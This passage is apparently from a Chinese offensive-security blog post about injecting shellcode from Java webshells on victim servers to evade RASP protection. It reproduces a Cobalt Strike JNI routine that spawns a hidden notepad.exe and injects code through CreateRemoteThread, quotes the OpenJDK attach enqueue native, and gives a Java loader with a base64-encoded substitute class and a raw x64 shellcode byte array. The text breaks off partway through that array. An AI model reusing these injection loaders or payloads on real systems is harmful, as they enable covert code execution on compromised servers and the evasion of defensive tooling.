**作者：p1ay2win@天玄安全实验室**  
**原文链接：**
## 前言
随着RASP技术的发展，普通webshell已经很难有用武之地，甚至是各种内存马也逐渐捉襟见肘。秉承着《[JSP
Webshell那些事——攻击篇（上）](https://www.anquanke.com/post/id/214435)》中向下走的思路，存不存在一种在Java代码中执行机器码的方法呢？答案是肯定的，常见的注入方式有JNI、JNA和利用JDK自带的Native方法等，其中笔者还找到了一种鲜有文章介绍的，基于HotSpot虚拟机，并较为通用的注入方法。
## 基于JNI
Java底层虽然是C/C实现的，但不能直接执行C/C代码。若想要执行C/C++的代码，一般得通过JNI，即Java本地调用（Java Native
Interface），加载JNI链接库，调用Native方法实现。
Cobalt
Strike官网博客上有一篇《[如何从Java注入shellcode](https://www.cobaltstrike.com/blog/how-to-inject-shellcode-from-java/)》的文章，便是基于JNI实现，通过Native方法调用C/C++代码将shellcode注入到内存中。
    //C/C++代码中声明的函数对应Demo#inject本地方法
    JNIEXPORT void JNICALL Java_Demo_inject(JNIEnv * env, jobject object, jbyteArray jdata) {
       jbyte * data = (*env)->GetByteArrayElements(env, jdata, 0);
       jsize length = (*env)->GetArrayLength(env, jdata);
       inject((LPCVOID)data, (SIZE_T)length);
       (*env)->ReleaseByteArrayElements(env, jdata, data, 0);
    }
    //执行注入shellcode的代码
    /* inject some shellcode... enclosed stuff is the shellcode y0 */
    void inject(LPCVOID buffer, int length) {
        STARTUPINFO si;
        PROCESS_INFORMATION pi;
        HANDLE hProcess   = NULL;
        SIZE_T wrote;
        LPVOID ptr;
        char lbuffer[1024];
        char cmdbuff[1024];
        /* reset some stuff */
        ZeroMemory( &si, sizeof(si) );
        si.cb = sizeof(si);
        ZeroMemory( &pi, sizeof(pi) );
        /* start a process */
        GetStartupInfo(&si);
        si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
        si.wShowWindow = SW_HIDE;
        si.hStdOutput = NULL;
        si.hStdError = NULL;
        si.hStdInput = NULL;
        /* resolve windir? */
        GetEnvironmentVariableA("windir", lbuffer, 1024);
        /* setup our path... choose wisely for 32bit and 64bit platforms */
        #ifdef _IS64_
            _snprintf(cmdbuff, 1024, "%s\\SysWOW64\\notepad.exe", lbuffer);
        #else
            _snprintf(cmdbuff, 1024, "%s\\System32\\notepad.exe", lbuffer);
        #endif
        /* spawn the process, baby! */
        if (!CreateProcessA(NULL, cmdbuff, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi))
            return;
        hProcess = pi.hProcess;
        if( !hProcess )
            return;
        /* allocate memory in our process */
        ptr = (LPVOID)VirtualAllocEx(hProcess, 0, length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
        /* write our shellcode to the process */
        WriteProcessMemory(hProcess, ptr, buffer, (SIZE_T)length, (SIZE_T *)&wrote);
        if (wrote != length)
            return;
        /* create a thread in the process */
        CreateRemoteThread(hProcess, NULL, 0, ptr, NULL, 0, NULL);
    }
这种方法需要自行编写个链接库，并上传到受害服务器上，利用起来并不显得优雅。
还有另一种方法是利用JNA第三方库，可以直接调用内核的函数，实现Shellcode注入。在[@yzddmr6](https://yzddmr6.com/)师傅的[Java-Shellcode-Loader](https://github.com/yzddmr6/Java-Shellcode-Loader)项目中有实现，但JNA本质上还是基于JNI，使用时还是要加载JNA自己的链接库，并且JDK中默认不包含JNA这个类库，使用时需要想办法引入。
## 基于JDK自带的Native方法
第一个介绍的可能是冰蝎的作者@[rebeyond](https://github.com/rebeyond)师傅首先发现的方法，一种基于JDK自带的Native方法的shellcode注入，严格来说是基于HotSpot虚拟机的JDK的自带Native方法。它是`sun/tools/attach/VirtualMachineImpl#enqueue`Native方法，存在于用于attach
Java进程的`tools.jar`包中。
当运行在Windows上时，相应的`enqueue`
Native方法实现在[/src/jdk.attach/windows/native/libattach/VirtualMachineImpl.c](https://github.com/openjdk/jdk/blob/9623d5bb46d14018a2b777fb7ffed6c66d912c84/src/jdk.attach/windows/native/libattach/VirtualMachineImpl.c)中，其中
**Create thread in target process to execute code** 的操作，不能说跟前面Cobalt
Strike注入shellcode的操作毫不相干，只能说是一模一样。
    JNIEXPORT void JNICALL Java_sun_tools_attach_VirtualMachineImpl_enqueue
      (JNIEnv *env, jclass cls, jlong handle, jbyteArray stub, jstring cmd,
       jstring pipename, jobjectArray args)
    {
        ...
        /*
         * Allocate memory in target process for data and code stub
         * (assumed aligned and matches architecture of target process)
         */
        hProcess = (HANDLE)handle;
        pData = (DataBlock*) VirtualAllocEx( hProcess, 0, sizeof(DataBlock), MEM_COMMIT, PAGE_READWRITE );
        if (pData == NULL) {
            JNU_ThrowIOExceptionWithLastError(env, "VirtualAllocEx failed");
            return;
        }
        WriteProcessMemory( hProcess, (LPVOID)pData, (LPCVOID)&data, (SIZE_T)sizeof(DataBlock), NULL );
        stubLen = (DWORD)(*env)->GetArrayLength(env, stub);
        stubCode = (*env)->GetByteArrayElements(env, stub, &isCopy);
        if ((*env)->ExceptionOccurred(env)) return;
        pCode = (PDWORD) VirtualAllocEx( hProcess, 0, stubLen, MEM_COMMIT, PAGE_EXECUTE_READWRITE );
        if (pCode == NULL) {
            JNU_ThrowIOExceptionWithLastError(env, "VirtualAllocEx failed");
            VirtualFreeEx(hProcess, pData, 0, MEM_RELEASE);
            (*env)->ReleaseByteArrayElements(env, stub, stubCode, JNI_ABORT);
            return;
        }
        WriteProcessMemory( hProcess, (LPVOID)pCode, (LPCVOID)stubCode, (SIZE_T)stubLen, NULL );
        (*env)->ReleaseByteArrayElements(env, stub, stubCode, JNI_ABORT);
        /*
         * Create thread in target process to execute code
         */
        hThread = CreateRemoteThread( hProcess,
                                      NULL,
                                      0,
                                      (LPTHREAD_START_ROUTINE) pCode,
                                      pData,
                                      0,
                                      NULL );
        ...
    }
当然你不能说这个是bug，只能说是feature。
相应的Demo是比较简单，在`stub`参数中传入shellcode即可，@[rebeyond](https://github.com/rebeyond)师傅已经给出了代码，笔者在这里做了点简化。不过实现Native方法的链接库`attach.dll`默认存在，但`tools.jar`这个包不一定存在，@[rebeyond](https://github.com/rebeyond)师傅巧妙的利用了双亲委派机制，当jvm中没有加载`VirtualMachineImpl`类时，就会使用下面base64编码的类替代，当然这种方法仅适用于Windows，因为Linux下`enqueue`并不是这么实现的。
    import java.io.ByteArrayOutputStream;
    import java.lang.reflect.Method;
    import java.util.Base64;
    public class WindowsAgentShellcodeLoader {
        public static void main(String[] args) {
            try {
                String classStr = "yv66vgAAADQAMgoABwAjCAAkCgAlACYF//////////8IACcHACgKAAsAKQcAKgoACQArBwAsAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBAChMc3VuL3Rvb2xzL2F0dGFjaC9XaW5kb3dzVmlydHVhbE1hY2hpbmU7AQAHZW5xdWV1ZQEAPShKW0JMamF2YS9sYW5nL1N0cmluZztMamF2YS9sYW5nL1N0cmluZztbTGphdmEvbGFuZy9PYmplY3Q7KVYBAApFeGNlcHRpb25zBwAtAQALb3BlblByb2Nlc3MBAAQoSSlKAQADcnVuAQAFKFtCKVYBAAR2YXIyAQAVTGphdmEvbGFuZy9FeGNlcHRpb247AQADYnVmAQACW0IBAA1TdGFja01hcFRhYmxlBwAqAQAKU291cmNlRmlsZQEAGldpbmRvd3NWaXJ0dWFsTWFjaGluZS5qYXZhDAAMAA0BAAZhdHRhY2gHAC4MAC8AMAEABHRlc3QBABBqYXZhL2xhbmcvT2JqZWN0DAATABQBABNqYXZhL2xhbmcvRXhjZXB0aW9uDAAxAA0BACZzdW4vdG9vbHMvYXR0YWNoL1dpbmRvd3NWaXJ0dWFsTWFjaGluZQEAE2phdmEvaW8vSU9FeGNlcHRpb24BABBqYXZhL2xhbmcvU3lzdGVtAQALbG9hZExpYnJhcnkBABUoTGphdmEvbGFuZy9TdHJpbmc7KVYBAA9wcmludFN0YWNrVHJhY2UAIQALAAcAAAAAAAQAAQAMAA0AAQAOAAAAMwABAAEAAAAFKrcAAbEAAAACAA8AAAAKAAIAAAAGAAQABwAQAAAADAABAAAABQARABIAAAGIABMAFAABABUAAAAEAAEAFgEIABcAGAABABUAAAAEAAEAFgAJABkAGgABAA4AAAB6AAYAAgAAAB0SArgAAxQABCoSBhIGA70AB7gACKcACEwrtgAKsQABAAUAFAAXAAkAAwAPAAAAGgAGAAAADgAFABAAFAATABcAEQAYABIAHAAVABAAAAAWAAIAGAAEABsAHAABAAAAHQAdAB4AAAAfAAAABwACVwcAIAQAAQAhAAAAAgAi";
                Class clazz = new MyClassLoader().get(Base64.getDecoder().decode(classStr));
                byte buf[] = new byte[]{
                        (byte) 0xFC, (byte) 0x48, (byte) 0x83, (byte) 0xE4, (byte) 0xF0, (byte) 0xE8, (byte) 0xC0, (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x41, (byte) 0x51, (byte) 0x41, (byte) 0x50, (byte) 0x52, (byte) 0x51,
                        (byte) 0x56, (byte) 0x48, (byte) 0x31, (byte) 0xD2, (byte) 0x65, (byte) 0x48, (byte) 0x8B, (byte) 0x52, (byte) 0x60, (byte) 0x48, (byte) 0x8B, (byte) 0x52, (byte) 0x18, (byte) 0x48, (byte) 0x8B, (byte) 0x52,
                        (byte) 0x20, (byte) 0x48, (byte) 0x8B, (byte) 0x72, (byte) 0x50, (byte) 0x48, (byte) 0x0F, (byte) 0xB7, (byte) 0x4A, (byte) 0x4A, (byte) 0x4D, (byte) 0x31, (byte) 0xC9, (byte) 0x48, (byte) 0x31, (byte) 0xC0,
                        (byte) 0xAC, (byte) 0x3C, (byte) 0x61, (byte) 0x7C, (byte) 0x02, (byte) 0x2C, (byte) 0x20, (byte) 0x41, (byte) 0xC1, (byte) 0xC9, (byte) 0x0D, (byte) 0x41, (byte) 0x01, (byte) 0xC1, (byte) 0xE2, (byte) 0xED,
                        (byte) 0x52, (byte) 0x41, (byte) 0x51, (byte) 0x48, (byte) 0x8B, (byte) 0x52, (byte) 0x20, (byte) 0x8B, (byte) 0x42, (byte) 0x3C, (byte) 0x48, (byte) 0x01, (byte) 0xD0, (byte) 0x8B, (byte) 0x80, (byte) 0x88,
                        (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x48, (byte) 0x85, (byte) 0xC0, (byte) 0x74, (byte) 0x67, (byte) 0x48, (byte) 0x01, (byte) 0xD0, (byte) 0x50, (byte) 0x8B, (byte) 0x48, (byte) 0x18, (byte) 0x44,
                        (byte) 0x8B, (byte) 0x40, (byte) 0x20, (byte) 0x49, (byte) 0x01, (byte) 0xD0, (byte) 0xE3, (byte) 0x56, (byte) 0x48, (byte) 0xFF, (byte) 0xC9, (byte) 0x41, (byte) 0x8B, (byte) 0x34, (byte) 0x88, (byte) 0x48,